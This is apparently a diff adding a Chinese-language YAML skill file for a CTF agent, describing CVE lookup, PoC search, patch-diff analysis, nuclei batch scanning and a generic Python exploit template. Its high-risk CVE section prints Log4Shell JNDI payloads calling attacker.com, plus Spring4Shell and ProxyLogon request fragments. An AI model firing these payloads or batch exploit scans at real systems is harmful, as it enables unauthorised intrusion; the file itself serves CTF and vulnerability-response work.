@@ -1,0 +1,300 @@
+name: cve_database
+description: CVE漏洞库查询与利用 - 涵盖CVE漏洞查询、POC获取、漏洞验证、批量检测的完整流程，支持最新高危CVE快速响应
+version: "2.0"
+author: CTF-Agent Team
+tags: [cve, vulnerability, exploit, poc, patch-analysis]
+priority: high
+
+# 使用场景
+scenarios:
+  - 最新CVE漏洞快速响应
+  - 已知CVE批量检测
+  - POC开发与验证
+  - 补丁分析推导漏洞
+  - 漏洞情报收集
+
+# 核心技术
+techniques:
+  - CVE查询: 多源CVE数据库查询、漏洞详情获取
+  - POC获取: ExploitDB、GitHub、 nuclei模板获取
+  - 漏洞验证: 本地环境搭建、POC测试验证
+  - 补丁分析: Git diff分析、补丁逆向推导漏洞点
+  - 批量检测: nuclei模板生成、批量资产扫描
+
+# 工具列表
+tools:
+  - nuclei: CVE模板批量扫描
+  - cve-search: CVE数据库搜索
+  - searchsploit: ExploitDB本地搜索
+  - cve-bin-tool: 二进制CVE检测
+  - trivy: 容器CVE扫描
+  - grype: 容器漏洞扫描
+  - snyk: 依赖漏洞检测
+  - vulners: 漏洞情报API
+
+# CVE查询源
+cve_sources:
+  - NVD (National Vulnerability Database):
+    url: https://nvd.nist.gov/vuln/search
+    api: https://services.nvd.nist.gov/rest/json/cves/2.0
+
+  - ExploitDB:
+    url: https://www.exploit-db.com
+    local: searchsploit
+
+  - Vulners:
+    url: https://vulners.com
+    api: https://vulners.com/api/v3/search
+
+  - GitHub:
+    search: https://github.com/search?q=CVE-XXXX-XXXX
+
+  - nuclei-templates:
+    path: https://github.com/projectdiscovery/nuclei-templates
+
+# CVE查询流程
+query_workflow:
+  - step1: 确定CVE编号
+    template: |
+      # 从漏洞通告获取CVE编号
+      # 或从NVD搜索关键词
+
+      # API查询示例
+      curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-0001" | jq
+
+      # 搜索关键词
+      curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=log4j" | jq
+
+  - step2: 获取漏洞详情
+    template: |
+      # 解析CVE详情
+      CVE_INFO = {
+        "id": "CVE-XXXX-XXXX",
+        "severity": "CVSS评分",
+        "affected": "受影响版本",
+        "description": "漏洞描述",
+        "references": "参考链接",
+        "patch": "修复版本"
+      }
+
+  - step3: 搜索POC
+    template: |
+      # ExploitDB搜索
+      searchsploit CVE-XXXX-XXXX
+
+      # GitHub搜索
+      # 使用GitHub API或直接搜索
+
+      # nuclei模板检查
+      nuclei -t cves/ -l target.txt -id CVE-XXXX-XXXX
+
+  - step4: 本地验证
+    template: |
+      #搭建测试环境
+      # 使用Docker快速复现
+      docker run -d --name vuln-target vulnerable-image:version
+
+      # 执行POC测试
+      python exploit.py -t http://localhost:8080
+
+      # 验证成功后记录
+
+  - step5: 批量扫描
+    template: |
+      # 使用nuclei批量扫描
+      nuclei -l assets.txt -t cves/CVE-XXXX-XXXX.yaml -o results.txt
+
+# 高危CVE快速响应模板
+critical_cves:
+  - Log4Shell (CVE-2021-44228):
+    severity: 10.0 (Critical)
+    affected: Log4j 2.0-beta9 to 2.14.1
+    poc: |
+      # 检测payload
+      ${jndi:ldap://attacker.com/a}
+      ${jndi:dns://attacker.com/a}
+
+      # nuclei检测
+      nuclei -t cves/CVE-2021-44228.yaml -l targets.txt
+
+      # 修复: 升级到Log4j 2.17.0+
+
+  - Spring4Shell (CVE-2022-22965):
+    severity: 9.8 (Critical)
+    affected: Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19
+    poc: |
+      # 检测payload
+      POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%25%25%25%25%25%25%25{c2}...
+
+      # nuclei检测
+      nuclei -t cves/CVE-2022-22965.yaml
+
+      # 修复: 升级Spring Framework
+
+  - ProxyLogon (CVE-2021-26855):
+    severity: 9.8 (Critical)
+    affected: Microsoft Exchange Server 2013/2016/2019
+    poc: |
+      # SSRF检测
+      POST /ecp/DDI/DDIService.svc/SetObject
+      X-BEResource: localhost~1942062738
+
+      # 使用自动化工具
+      proxylogon_scan.py -t https://target.com
+
+      # 修复: 安装Microsoft安全更新
+
+  - CVE-2023-44487 (HTTP/2 Rapid Reset):
+    severity: 7.5 (High)
+    affected: 多种HTTP/2实现
+    poc: |
+      # HTTP/2快速重置攻击
+      # 发送大量请求后立即取消
+
+      # 检测方法
+      h2scan -t target.com
+
+      # 修复: 应用厂商补丁
+
+# 补丁分析流程
+patch_analysis:
+  - git_diff_analysis:
+    template: |
+      # 获取补丁commit
+      git log --oneline --grep="CVE"
+
+      # 分析补丁差异
+      git show <commit-hash>
+
+      # 找出安全相关修改
+      git diff <before>..<after> --stat
+
+      # 定位漏洞点
+      # 重点关注:
+      # - 输入验证新增
+      # - 空指针检查
+      # - 权限检查
+      # - 边界检查
+
+  - reverse_patch:
+    template: |
+      # 从补丁逆向推导漏洞
+      # 1. 分析补丁修复了什么
+      # 2. 确定漏洞触发条件
+      # 3. 编写逆向POC
+
+      # 示例: 补丁添加了XSS过滤
+      # 漏洞: 原版本存在XSS
+      # POC: 使用补丁过滤前绕过方式
+
+# POC开发模板
+poc_template:
+  - python_poc:
+    template: |
+      #!/usr/bin/env python3
+      """
+      CVE-XXXX-XXXX POC
+      Vulnerability: [漏洞类型]
+      Affected: [受影响版本]
+      """
+
+      import requests
+      import sys
+
+      def exploit(target):
+          payload = "[payload here]"
+          try:
+              response = requests.post(
+                  target,
+                  data=payload,
+                  timeout=10
+              )
+              if "success_indicator" in response.text:
+                  print(f"[+] Exploit successful: {target}")
+                  return True
+          except Exception as e:
+              print(f"[-] Error: {e}")
+          return False
+
+      if __name__ == "__main__":
+          if len(sys.argv) < 2:
+              print("Usage: python exploit.py <target>")
+              sys.exit(1)
+          exploit(sys.argv[1])
+
+  - nuclei_template:
+    template: |
+      id: CVE-XXXX-XXXX
+
+      info:
+        name: [漏洞名称]
+        author: CTF-Agent
+        severity: critical
+        description: |
+          [漏洞描述]
+          受影响版本: [version range]
+        reference:
+          - https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXX
+          - https://github.com/...
+        tags: cve,critical,[漏洞类型]
+
+      requests:
+        - method: POST
+          path:
+            - "{{BaseURL}}/vulnerable_endpoint"
+          headers:
+            Content-Type: application/x-www-form-urlencoded
+          body: |
+            payload={{payload}}
+          matchers:
+            - type: word
+              words:
+                - "[success_indicator]"
+              part: body
+
+          matchers-condition: and
+
+# 批量CVE扫描
+batch_scan:
+  - template: |
+      # 批量CVE扫描脚本
+
+      # 1. 准备资产列表
+      cat targets.txt
+
+      # 2. 执行批量扫描
+      nuclei -l targets.txt -t cves/ -severity critical,high -o cve_results.txt
+
+      # 3. 按CVE分类结果
+      grep "CVE-" cve_results.txt | sort | uniq -c
+
+      # 4. 生成报告
+      python report_gen.py -i cve_results.txt
+
+# CVE监控与预警
+cve_monitoring:
+  - sources:
+      - https://cve.mitre.org/data/downloads/index.html
+      - https://nvd.nist.gov/vuln/data-feeds
+      - https://github.com/CVEProject/cvelistV5
+
+  - automation: |
+      # 每日CVE监控脚本
+      # 获取最新CVE列表
+      curl -s https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=2024-01-01T00:00:00.000
+
+      # 过滤高危CVE
+      jq '.vulnerabilities[] | select(.cve.metrics.cvssMetricV31.cvssData.baseScore >= 9.0)'
+
+      # 发送预警通知
+      # - 新增Critical CVE
+      # - 影响范围包含项目组件
+
+# 参考资源
+references:
+  - https://nvd.nist.gov/
+  - https://cve.mitre.org/
+  - https://www.exploit-db.com/
+  - https://vulners.com/
+  - https://github.com/projectdiscovery/nuclei-templates
+  - https://github.com/trickest/cve
